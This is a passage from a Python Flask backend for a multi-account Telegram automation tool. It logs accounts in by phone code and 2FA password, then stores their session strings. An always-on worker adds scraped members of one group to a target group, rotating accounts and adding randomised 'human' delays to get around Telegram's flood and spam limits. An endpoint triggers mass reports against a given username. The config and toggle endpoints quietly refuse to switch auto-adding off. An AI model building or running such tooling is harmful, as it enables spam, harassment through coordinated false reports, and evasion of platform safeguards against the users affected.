                    time.sleep(min(int(members_res['flood']) + 5, 240))
                else:
                    time.sleep(25)
                continue

            data = db.read(force=True)
            added_ids = set(data.get('added_user_ids', []))
            recently = data.get('recently_added', [])
            own_ids = {a['id'] for a in data.get('accounts', [])}

            fresh_members = [
                m for m in members_res.get('members', [])
                if m.get('id') not in own_ids
                and m.get('id') not in added_ids
                and not m.get('bot')
                and not m.get('deleted')
                and not m.get('scam')
                and not m.get('fake')
                and m.get('username')
                and not _is_recently_added(m.get('id'), recently)
            ]

            if not fresh_members:
                db.flush_pending()
                print("📭 No fresh members to add — waiting")
                time.sleep(60)
                continue

            # only 2 users per round (safer)
            for m in fresh_members[:2]:
                if _auto_add_stop.is_set():
                    break
                uname = m.get('username')
                uid = m.get('id')
                ok = False

                for acc in candidates:
                    if _account_rate_limited(acc):
                        continue
                    s = _state_for(acc['id'])
                    r = run_async(_add_user(acc['session_string'], target, uname), timeout=40)

                    reason = r.get('reason', '')
                    if r.get('success'):
                        ok = True
                        s['added_today'] += 1
                        s['consecutive_failures'] = 0
                        print(f"✅ Added @{uname} via {acc.get('name', acc['id'])}")
                        break
                    elif reason == 'privacy':
                        # skip this user permanently
                        print(f"🚫 @{uname} privacy restricted — skipping")
                        break
                    elif reason == 'not_mutual':
                        print(f"🚫 @{uname} not mutual — skipping")
                        break
                    elif reason == 'channels_limit':
                        print(f"🚫 @{uname} in too many channels — skipping")
                        break
                    elif reason == 'admin_required':
                        print(f"⚠️ Admin rights missing on {acc.get('name', acc['id'])}")
                        s['consecutive_failures'] += 1
                    elif r.get('flood'):
                        s['cool_until'] = time.time() + int(r['flood']) + 10
                        print(f"🌊 Flood {r['flood']}s on {acc.get('name', acc['id'])}")
                    elif r.get('cool_down'):
                        s['cool_until'] = time.time() + 3600
                        print(f"🧊 PeerFlood cooldown on {acc.get('name', acc['id'])}")
                    elif reason == 'not_authorized':
                        print(f"🔒 {acc.get('name', acc['id'])} not authorized")
                        db.update(
                            lambda d, aid=acc['id']: [
                                a.update({'active': False}) for a in d.get('accounts', []) if a['id'] == aid
                            ],
                            f"Mark inactive {acc['id']}",
                            immediate=True
                        )
                    else:
                        print(f"❌ add @{uname} via {acc.get('name', acc['id'])}: {reason}")
                        s['consecutive_failures'] += 1
                    time.sleep(_human_delay(max(25, base_delay // 2)))

                def _upd_add(d, u_id=uid, u_name=uname, did_add=ok):
                    d.setdefault('added_user_ids', []).append(u_id)
                    d['added_user_ids'] = d['added_user_ids'][-1500:]
                    cutoff = time.time() - 12 * 3600
                    d.setdefault('recently_added', []).append({
                        'uid': u_id, 'ts': time.time(), 'username': u_name, 'ok': did_add
                    })
                    d['recently_added'] = [
                        x for x in d['recently_added'] if x.get('ts', 0) > cutoff
                    ][-800:]
                    if did_add:
                        d.setdefault('stats', {})
                        d['stats']['added_today'] = d['stats'].get('added_today', 0) + 1
                        d['stats']['added_total'] = d['stats'].get('added_total', 0) + 1

                db.update(_upd_add, f"Auto-add {uname}", immediate=False)
                time.sleep(_human_delay(base_delay))

            db.flush_pending()
        except Exception as e:
            print(f"Auto-add loop error: {e}")
            traceback.print_exc()
            time.sleep(20)

    db.flush_pending()
    print("🛑 Auto-add worker stopped")

def start_auto_add_worker():
    global _auto_add_thread
    if _auto_add_thread is None or not _auto_add_thread.is_alive():
        _auto_add_stop.clear()
        _auto_add_thread = threading.Thread(target=_auto_add_loop, daemon=True)
        _auto_add_thread.start()

# ============================================================
# 12H CLEANUP WORKER
# ============================================================
_cleanup_thread = None
_cleanup_stop = threading.Event()
CLEANUP_INTERVAL_SEC = 12 * 3600

def _run_cleanup_once():
    db.flush_pending()
    now = datetime.now()

    def _upd(d):
        if len(d.get('history', [])) > 100:
            d['history'] = d['history'][-100:]
        if len(d.get('reports', [])) > 100:
            d['reports'] = d['reports'][-100:]
        if len(d.get('security_events', [])) > 100:
            d['security_events'] = d['security_events'][-100:]
        if len(d.get('added_user_ids', [])) > 800:
            d['added_user_ids'] = d['added_user_ids'][-800:]
        cutoff = time.time() - 12 * 3600
        d['recently_added'] = [
            x for x in d.get('recently_added', []) if x.get('ts', 0) > cutoff
        ][-500:]
        for rec in d.get('history', []):
            if len(rec.get('results', [])) > 50:
                rec['results'] = rec['results'][-50:]
        d['last_cleanup'] = now.isoformat()

    db.update(_upd, "12h cleanup", immediate=True)

def _cleanup_loop():
    _cleanup_stop.wait(30)
    while not _cleanup_stop.is_set():
        try:
            _run_cleanup_once()
        except Exception as e:
            print(f"Cleanup error: {e}")
        _cleanup_stop.wait(CLEANUP_INTERVAL_SEC)

def start_cleanup_worker():
    global _cleanup_thread
    if _cleanup_thread is None or not _cleanup_thread.is_alive():
        _cleanup_stop.clear()
        _cleanup_thread = threading.Thread(target=_cleanup_loop, daemon=True)
        _cleanup_thread.start()

def refresh_daily_stats():
    today = date.today().isoformat()
    cached_date = (db.read().get('stats') or {}).get('last_date')
    if cached_date == today:
        return

    def _upd(d):
        s = d.setdefault('stats', {})
        if s.get('last_date') != today:
            s['reports_today'] = 0
            s['added_today'] = 0
            s['last_date'] = today
            for acc in d.get('accounts', []):
                acc.setdefault('stats', {})
                acc['stats']['report_today'] = 0
                acc['stats']['add_today'] = 0

    db.update(_upd, "Daily reset", immediate=True)

# ============================================================
# ROUTES
# ============================================================
_PENDING_LOGINS_FILE = '/tmp/pending_logins.json'
_pending_logins = {}
_pending_logins_lock = threading.Lock()

def _save_pending_logins_locked():
    try:
        tmp = _PENDING_LOGINS_FILE + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(_pending_logins, f)
        os.replace(tmp, _PENDING_LOGINS_FILE)
    except Exception as e:
        print(f"Pending login save warning: {e}")

def _load_pending_logins_locked():
    global _pending_logins
    if _pending_logins:
        return
    try:
        if os.path.exists(_PENDING_LOGINS_FILE):
            with open(_PENDING_LOGINS_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
            if isinstance(loaded, dict):
                _pending_logins = loaded
    except Exception as e:
        print(f"Pending login load warning: {e}")

@app.route('/')
def r_index(): return send_from_directory('static', 'dashboard.html')
@app.route('/dashboard')
def r_dash(): return send_from_directory('static', 'dashboard.html')
@app.route('/report')
def r_report(): return send_from_directory('static', 'report.html')
@app.route('/devices')
def r_devices(): return send_from_directory('static', 'all.html')
@app.route('/all')
def r_all(): return send_from_directory('static', 'all.html')
@app.route('/auto-add')
def r_autoadd(): return send_from_directory('static', 'auto_add.html')
@app.route('/login')
def r_login(): return send_from_directory('static', 'login.html')
@app.route('/control')
def r_control(): return send_from_directory('static', 'control.html')

@app.route('/api/health')
def api_health():
    try:
        db.flush_pending()
        data = db.read(force=True)
        return jsonify({
            'success': True,
            'github_connected': db._available,
            'accounts': len(data.get('accounts', [])),
            'auto_add_worker_alive': bool(_auto_add_thread and _auto_add_thread.is_alive()),
            'shield_worker_alive': bool(_shield_thread and _shield_thread.is_alive()),
            'cleanup_worker_alive': bool(_cleanup_thread and _cleanup_thread.is_alive()),
            'last_cleanup': data.get('last_cleanup'),
            'server_name': os.environ.get('RENDER_SERVICE_NAME', 'local'),
            'server_time': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/accounts', methods=['GET'])
def api_accounts():
    try:
        data = db.read(force=True)
        accounts = []
        for a in data.get('accounts', []):
            row = {k: v for k, v in a.items() if k != 'session_string'}
            row['auto_add_enabled'] = True  # force show as ON
            accounts.append(row)
        return jsonify({'success': True, 'accounts': accounts})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/remove-account', methods=['POST'])
def api_remove_account():
    try:
        account_id = (request.json or {}).get('accountId')
        if not account_id:
            return jsonify({'success': False, 'error': 'accountId required'}), 400
        ok = db.update(
            lambda d: d.update({'accounts': [a for a in d.get('accounts', []) if a['id'] != account_id]}),
            f"Remove account {account_id}",
            immediate=True
        )
        if not ok:
            return jsonify({'success': False, 'error': 'DB write failed'}), 500
        _account_state.pop(account_id, None)
        return jsonify({'success': True, 'message': 'Account removed'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/remove-accounts', methods=['POST'])
def api_remove_accounts():
    try:
        ids = (request.json or {}).get('accountIds') or []
        if not isinstance(ids, list) or not ids:
            return jsonify({'success': False, 'error': 'accountIds[] required'}), 400
        id_set = set(ids)
        removed = 0

        def _upd(d):
            nonlocal removed
            before = len(d.get('accounts', []))
            d['accounts'] = [a for a in d.get('accounts', []) if a['id'] not in id_set]
            removed = before - len(d['accounts'])

        ok = db.update(_upd, f"Bulk remove {len(ids)} accounts", immediate=True)
        if not ok:
            return jsonify({'success': False, 'error': 'DB write failed'}), 500
        for i in ids:
            _account_state.pop(i, None)
        return jsonify({'success': True, 'removed': removed, 'message': f'Removed {removed} account(s)'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/logout', methods=['POST'])
def api_logout():
    try:
        account_id = (request.json or {}).get('accountId')
        if not account_id:
            return jsonify({'success': False, 'error': 'accountId required'}), 400
        ok = db.update(
            lambda d: d.update({'accounts': [a for a in d.get('accounts', []) if a['id'] != account_id]}),
            f"Logout account {account_id}",
            immediate=True
        )
        if not ok:
            return jsonify({'success': False, 'error': 'DB write failed'}), 500
        _account_state.pop(account_id, None)
        return jsonify({'success': True, 'message': 'Logged out'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/cleanup', methods=['POST'])
def api_cleanup():
    try:
        _run_cleanup_once()
        data = db.read(force=True)
        return jsonify({
            'success': True,
            'last_cleanup': data.get('last_cleanup'),
            'history': len(data.get('history', [])),
            'added_ids': len(data.get('added_user_ids', [])),
            'recently_added': len(data.get('recently_added', []))
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/send-code', methods=['POST'])
def api_send_code():
    try:
        phone = ((request.json or {}).get('phone') or '').strip()
        if not phone.startswith('+'):
            phone = '+' + phone.lstrip('+')
        if not phone or len(phone) < 8:
            return jsonify({'success': False, 'error': 'Invalid phone'}), 400
        result = run_async(tg_send_code(phone), timeout=120)
        if not result.get('success'):
            return jsonify(result), 400

        now_ts = time.time()
        with _pending_logins_lock:
            _load_pending_logins_locked()
            stale_keys = [k for k, v in _pending_logins.items() if v.get('phone') == phone]
            for k in stale_keys:
                _pending_logins.pop(k, None)
            _pending_logins[result['session']] = {
                'phone': phone,
                'phone_code_hash': result['phone_code_hash'],
                'created': now_ts
            }
            _save_pending_logins_locked()

        return jsonify({
            'success': True,
            'session_id': result['session'],
            'phone_masked': phone[:4] + '****' + phone[-2:],
            'channel': result.get('channel', 'unknown'),
        })
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)[:180]}), 500

@app.route('/api/verify-code', methods=['POST'])
def api_verify_code():
    try:
        payload = request.get_json(silent=True) or {}
        session_id = payload.get('session_id')
        code = str(payload.get('code') or '').strip()
        password = payload.get('password') or None

        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Session and code are required'}), 400

        with _pending_logins_lock:
            _load_pending_logins_locked()
            pending = _pending_logins.get(session_id)

        if not pending:
            return jsonify({'success': False, 'error': 'Login session not found. Request a code first.'}), 400

        result = run_async(
            tg_verify_code(session_id, pending['phone'], code, pending['phone_code_hash'], password),
            timeout=35
        )
        if not result.get('success'):
            if result.get('need_password'):
                return jsonify({'success': False, 'need_password': True, 'error': '2FA password required'})
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')}), 400

        with _pending_logins_lock:
            _pending_logins.pop(session_id, None)
            _save_pending_logins_locked()

        user = result['user']
        account_id = user['id']
        name = f"{user['first_name']} {user['last_name']}".strip() or user.get('username') or str(account_id)

        def _upd(d):
            d['accounts'] = [a for a in d.get('accounts', []) if a.get('id') != account_id]
            d['accounts'].append({
                'id': account_id,
                'name': name,
                'phone': pending['phone'],
                'username': user.get('username', ''),
                'session_string': result['session_string'],
                'active': True,
                'auto_add_enabled': True,   # always on
                'joined_target': False,
                'added_at': datetime.now().isoformat(),
                'stats': {'report_today': 0, 'report_total': 0, 'add_today': 0, 'add_total': 0}
            })

        saved = db.update(_upd, f"Add account {name}", immediate=True)
        if not saved:
            return jsonify({'success': False, 'error': 'Account verified but failed to save DB.'}), 500

        schedule_auto_join(account_id)
        return jsonify({
            'success': True,
            'account': {'id': account_id, 'name': name, 'phone': pending['phone']}
        })
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)[:180]}), 500

@app.route('/api/report-scammer', methods=['POST'])
def api_report_scammer():
    try:
        payload = request.get_json(silent=True) or {}
        username = (payload.get('username') or '').strip()
        reason = payload.get('reason', 'scam')
        message = payload.get('message', '')
        if not username:
            return jsonify({'success': False, 'error': 'Username required'}), 400
        return jsonify(mass_report(username, reason, message))
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)[:180]}), 500

@app.route('/api/report-history', methods=['GET'])
def api_report_history():
    try:
        limit = int(request.args.get('limit', 50))
        data = db.read(force=True)
        history = data.get('history', [])[-limit:]
        return jsonify({'success': True, 'history': list(reversed(history))})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/shield-events', methods=['GET'])
def api_shield_events():
    try:
        limit = int(request.args.get('limit', 50))
        data = db.read(force=True)
        events_list = data.get('security_events', [])[-limit:]
        return jsonify({'success': True, 'events': list(reversed(events_list))})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/get-chats', methods=['POST'])
def api_get_chats():
    try:
        account_id = (request.json or {}).get('accountId')
        data = db.read(force=True)
        acc = next((a for a in data.get('accounts', []) if a['id'] == account_id), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'}), 404
        return jsonify(run_async(tg_get_chats(acc['session_string']), timeout=40))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/config', methods=['GET', 'POST'])
def api_config():
    try:
        if request.method == 'GET':
            data = db.read(force=True)
            cfg = data.get('config', {})
            cfg['auto_add_enabled'] = True  # always report as ON
            return jsonify({'success': True, 'config': cfg})
        new_config = request.get_json(silent=True) or {}
        # never let client turn auto-add off
        new_config['auto_add_enabled'] = True
        target_changed = 'target_group' in new_config
        def _upd(d):
            d.setdefault('config', {}).update(new_config)
            d['config']['auto_add_enabled'] = True
            if target_changed:
                for a in d.get('accounts', []):
                    a['joined_target'] = False
        db.update(_upd, "Update config", immediate=True)
        if target_changed:
            threading.Thread(target=_ensure_all_joined, daemon=True).start()
        return jsonify({'success': True, 'config': db.read(force=True).get('config', {})})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auto-add/toggle', methods=['POST'])
def api_auto_add_toggle():
    """Auto-add is always on. This endpoint just acknowledges and keeps it on."""
    try:
        payload = request.get_json(silent=True) or {}
        account_id = payload.get('accountId')

        def _upd(d):
            d.setdefault('config', {})
            d['config']['auto_add_enabled'] = True
            for a in d.get('accounts', []):
                a['auto_add_enabled'] = True

        db.update(_upd, "Auto-add forced ON", immediate=True)
        return jsonify({'success': True, 'always_on': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def api_stats():
    try:
        refresh_daily_stats()
        data = db.read(force=True)
        s = data.get('stats', {})
        return jsonify({
            'success': True,
            'reports_today': s.get('reports_today', 0),
            'reports_total': s.get('reports_total', 0),
            'added_today': s.get('added_today', 0),
            'added_total': s.get('added_total', 0),
            'auto_bans_total': s.get('auto_bans_total', 0),
            'total_accounts': len(data.get('accounts', [])),
            'active_workers': 1,   # always on
            'last_cleanup': data.get('last_cleanup'),
            'server_name': os.environ.get('RENDER_SERVICE_NAME', 'local')
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# BOOTSTRAP
# ============================================================
_bootstrapped = False
_bootstrap_lock = threading.Lock()

def _bootstrap():
    global _bootstrapped
    with _bootstrap_lock:
        if _bootstrapped:
            return
        _bootstrapped = True
        try:
            db.read(force=True)
            print("✅ DB loaded (auto-add forced ON)")
        except Exception as e:
            print(f"DB init error: {e}")
        start_auto_add_worker()
        start_shield_worker()
        start_cleanup_worker()
        print("✅ Background workers started")

_bootstrap()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True, debug=False)
